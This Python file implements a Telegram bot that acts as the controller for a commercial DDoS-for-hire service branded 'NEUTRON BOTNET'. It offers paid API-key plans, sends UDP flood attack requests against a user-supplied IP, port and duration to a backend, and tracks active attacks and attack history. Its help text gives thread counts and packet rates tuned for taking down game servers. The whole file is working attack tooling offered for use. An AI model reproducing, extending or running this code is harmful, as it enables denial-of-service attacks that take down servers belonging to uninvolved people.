# telegram_bot.py
import asyncio
import aiohttp
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime
import requests
import os

# Configuration
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_BASE_URL = os.getenv("API_BASE_URL", "http://localhost:8000")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",")]

class TelegramBot:
    def __init__(self):
        self.application = None
        self.user_api_keys = {}  # Store user's API keys temporarily
        
    async def start(self):
        self.application = Application.builder().token(BOT_TOKEN).build()
        
        self.application.add_handler(CallbackQueryHandler(self.handle_callback))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
        
        print("🤖 NEUTRON Telegram Bot Started!")
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = update.message.text
        
        if text.startswith("/start"):
            await self.show_main_menu(update, context)
        elif text.startswith("/setkey"):
            parts = text.split()
            if len(parts) == 2:
                self.user_api_keys[update.effective_user.id] = parts[1]
                await update.message.reply_text("✅ API Key saved! You can now start attacks.")
            else:
                await update.message.reply_text("Usage: /setkey YOUR_API_KEY")
        else:
            await self.show_main_menu(update, context)
    
    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("⚔️ Start Attack", callback_data="attack_start"),
             InlineKeyboardButton("🛑 Stop Attack", callback_data="attack_stop")],
            [InlineKeyboardButton("🔑 API Keys", callback_data="menu_keys"),
             InlineKeyboardButton("📊 Stats", callback_data="menu_stats")],
            [InlineKeyboardButton("📜 History", callback_data="menu_history"),
             InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")],
            [InlineKeyboardButton("🔄 Active Attacks", callback_data="active_attacks")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = (
            "🔥 *NEUTRON BOTNET CONTROLLER* 🔥\n\n"
            "⚡ *Attack Engine:* C Binary (1M-2M PPS)\n"
            "🎯 *Game Server Mode:* READY\n"
            "📡 *Status:* ONLINE\n\n"
            "💡 *First time?* Use /setkey YOUR_API_KEY\n\n"
            "👇 *Select an option:*"
        )
        
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        
        if data == "attack_start":
            await self.attack_prompt(query)
        elif data == "attack_stop":
            await self.stop_attack_prompt(query)
        elif data == "menu_keys":
            await self.keys_menu(query)
        elif data == "menu_stats":
            await self.show_stats(query)
        elif data == "menu_history":
            await self.show_history(query)
        elif data == "menu_help":
            await self.show_help(query)
        elif data == "active_attacks":
            await self.show_active(query)
        elif data == "gen_key":
            await self.generate_key(query)
        elif data == "my_keys":
            await self.list_keys(query)
        elif data == "revoke_key":
            await self.revoke_key_prompt(query)
        elif data == "back_main":
            await self.show_main_menu(update, context)
        elif data.startswith("takedown_"):
            parts = data.split("_")
            if len(parts) == 4:
                ip, port, duration = parts[1], parts[2], parts[3]
                await self.execute_takedown(query, ip, int(port), int(duration))
    
    async def attack_prompt(self, query):
        keyboard = [
            [InlineKeyboardButton("🎯 Quick Takedown (45s)", callback_data="takedown_")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "⚔️ *START ATTACK*\n\n"
            "Send attack details in format:\n"
            "`attack IP PORT DURATION`\n\n"
            "Example: `attack 1.2.3.4 27015 45`\n\n"
            "*Presets:*\n"
            "• 30s → Test attack\n"
            "• 45s → Standard takedown\n"
            "• 60s → Full takedown\n"
            "• 0s → Continuous (until stopped)",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def execute_takedown(self, query, ip, port, duration):
        user_id = query.from_user.id
        api_key = self.user_api_keys.get(user_id)
        
        if not api_key:
            await query.edit_message_text("❌ No API key set! Use /setkey YOUR_API_KEY")
            return
        
        try:
            response = requests.post(
                f"{API_BASE_URL}/v1/attack",
                json={
                    "target_ip": ip,
                    "target_port": port,
                    "duration": duration,
                    "method": "UDP",
                    "api_key": api_key
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                text = (
                    f"✅ *ATTACK STARTED!*\n\n"
                    f"🎯 Target: `{ip}:{port}`\n"
                    f"⚡ Bandwidth: {data['bandwidth_gbps']} Gbps\n"
                    f"📦 PPS: {data['pps']:,}\n"
                    f"⏱️ Duration: {duration}s\n"
                    f"🆔 Attack ID: `{data['attack_id']}`\n\n"
                    f"🔥 Target should go down in ~{duration//3} seconds!"
                )
                await query.edit_message_text(text, parse_mode="Markdown")
            else:
                await query.edit_message_text(f"❌ Attack failed: {response.text}")
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {e}")
    
    async def stop_attack_prompt(self, query):
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🛑 *STOP ATTACK*\n\n"
            "Send: `stop ATTACK_ID`\n\n"
            "To see active attacks, use 'Active Attacks' button.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def keys_menu(self, query):
        keyboard = [
            [InlineKeyboardButton("➕ Generate Key", callback_data="gen_key"),
             InlineKeyboardButton("📋 My Keys", callback_data="my_keys")],
            [InlineKeyboardButton("❌ Revoke Key", callback_data="revoke_key")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔑 *API KEY MANAGEMENT*\n\n"
            "• Generate Key - Create new API key\n"
            "• My Keys - List your keys\n"
            "• Revoke Key - Delete a key\n\n"
            "💡 PRO Plan: 5 concurrent attacks\n"
            "💡 ENTERPRISE: 20 concurrent attacks",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def generate_key(self, query):
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_keys")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            response = requests.post(
                f"{API_BASE_URL}/v1/keys/generate",
                json={"plan": "PRO", "concurrent": 5, "expiry_days": 30}
            )
            
            if response.status_code == 200:
                data = response.json()
                text = (
                    f"✅ *API KEY GENERATED*\n\n"
                    f"🔑 Key: `{data['api_key']}`\n"
                    f"📋 Plan: {data['plan']}\n"
                    f"⚡ Max Concurrent: {data['max_concurrent']}\n"
                    f"📅 Expiry: {data['expiry_date']}\n\n"
                    f"⚠️ *Save this key!*\n"
                    f"Use: `/setkey {data['api_key']}`"
                )
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
            else:
                await query.edit_message_text("❌ Failed to generate key", reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {e}", reply_markup=reply_markup)
    
    async def list_keys(self, query):
        user_id = query.from_user.id
        api_key = self.user_api_keys.get(user_id)
        
        if not api_key:
            await query.edit_message_text("❌ No API key set! Use /setkey YOUR_API_KEY")
            return
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_keys")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            response = requests.get(
                f"{API_BASE_URL}/v1/keys/list",
                headers={"X-API-Key": api_key}
            )
            
            if response.status_code == 200:
                data = response.json()
                keys = data.get("keys", [])
                if keys:
                    text = "🔑 *YOUR API KEYS*\n\n"
                    for k in keys[:5]:
                        text += f"• `{k['key'][:20]}...`\n  Plan: {k['plan']}\n  Attacks: {k.get('total_attacks', 0)}\n\n"
                    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
                else:
                    await query.edit_message_text("No API keys found. Generate one first!", reply_markup=reply_markup)
            else:
                await query.edit_message_text("❌ Failed to fetch keys", reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {e}", reply_markup=reply_markup)
    
    async def revoke_key_prompt(self, query):
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_keys")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "❌ *REVOKE API KEY*\n\n"
            "Send: `revoke YOUR_API_KEY`",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def show_stats(self, query):
        keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="menu_stats")],
                    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            response = requests.get(f"{API_BASE_URL}/v1/status")
            if response.status_code == 200:
                stats = response.json()
                text = (
                    "📊 *SYSTEM STATISTICS*\n\n"
                    f"🎯 Active Attacks: {stats.get('active_attacks', 0)}\n"
                    f"📈 Attacks Today: {stats.get('total_attacks_today', 0)}\n"
                    f"🔑 Total API Keys: {stats.get('total_api_keys', 0)}\n"
                    f"⚡ Max Bandwidth: {stats.get('bandwidth_capacity_gbps', 7)} Gbps\n"
                    f"📦 Max PPS: {stats.get('max_pps', 2000000):,}\n"
                    f"✅ Status: {stats.get('status', 'operational')}"
                )
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
            else:
                await query.edit_message_text("❌ Failed to fetch stats", reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ API connection failed: {e}", reply_markup=reply_markup)
    
    async def show_history(self, query):
        user_id = query.from_user.id
        api_key = self.user_api_keys.get(user_id)
        
        if not api_key:
            await query.edit_message_text("❌ No API key set! Use /setkey YOUR_API_KEY")
            return
        
        keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="menu_history")],
                    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            response = requests.get(
                f"{API_BASE_URL}/v1/attack/history?limit=10",
                headers={"X-API-Key": api_key}
            )
            
            if response.status_code == 200:
                data = response.json()
                attacks = data.get("attacks", [])
                if attacks:
                    text = "📜 *ATTACK HISTORY*\n\n"
                    for a in attacks[:10]:
                        status_emoji = "✅" if a.get('status') == 'completed' else "🔄"
                        text += (
                            f"{status_emoji} *{a.get('target_ip')}:{a.get('target_port')}*\n"
                            f"   Method: {a.get('method')} | Duration: {a.get('duration')}s\n"
                            f"   Bandwidth: {a.get('bandwidth_gbps')} Gbps\n"
                            f"   Status: {a.get('status')}\n\n"
                        )
                    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
                else:
                    await query.edit_message_text("No attack history found.", reply_markup=reply_markup)
            else:
                await query.edit_message_text("❌ Failed to fetch history", reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {e}", reply_markup=reply_markup)
    
    async def show_active(self, query):
        user_id = query.from_user.id
        api_key = self.user_api_keys.get(user_id)
        
        if not api_key:
            await query.edit_message_text("❌ No API key set! Use /setkey YOUR_API_KEY")
            return
        
        keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="active_attacks")],
                    [InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            response = requests.get(
                f"{API_BASE_URL}/v1/attack/active",
                headers={"X-API-Key": api_key}
            )
            
            if response.status_code == 200:
                data = response.json()
                attacks = data.get("active_attacks", {})
                if attacks:
                    text = "🔄 *ACTIVE ATTACKS*\n\n"
                    for aid, info in attacks.items():
                        text += (
                            f"🆔 `{aid[:16]}...`\n"
                            f"🎯 {info.get('target')}\n"
                            f"⚡ {info.get('bandwidth_gbps')} Gbps | {info.get('pps'):,} PPS\n"
                            f"⏱️ Remaining: {info.get('remaining')}s\n\n"
                        )
                    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
                else:
                    await query.edit_message_text("No active attacks.", reply_markup=reply_markup)
            else:
                await query.edit_message_text("❌ Failed to fetch active attacks", reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {e}", reply_markup=reply_markup)
    
    async def show_help(self, query):
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = (
            "ℹ️ *NEUTRON BOTNET HELP*\n\n"
            "📌 *Quick Commands*\n"
            "• `/start` - Show menu\n"
            "• `/setkey KEY` - Set your API key\n\n"
            
            "📌 *Attack Commands*\n"
            "• `attack IP PORT DURATION` - Start attack\n"
            "• `stop ATTACK_ID` - Stop attack\n\n"
            
            "📌 *Threads to PPS*\n"
            "• 8 threads = 1,000,000 PPS\n"
            "• 12 threads = 1,500,000 PPS (Recommended)\n"
            "• 16 threads = 2,000,000 PPS\n\n"
            
            "📌 *Game Server Takedown*\n"
            "• Duration: 45 seconds\n"
            "• Threads: 12 (1.5M PPS)\n"
            "• Method: UDP\n\n"
            
            "📌 *Support*\n"
            "Contact: @NEUTRON_SUPPORT"
        )
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def main():
    bot = TelegramBot()
    await bot.start()
    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
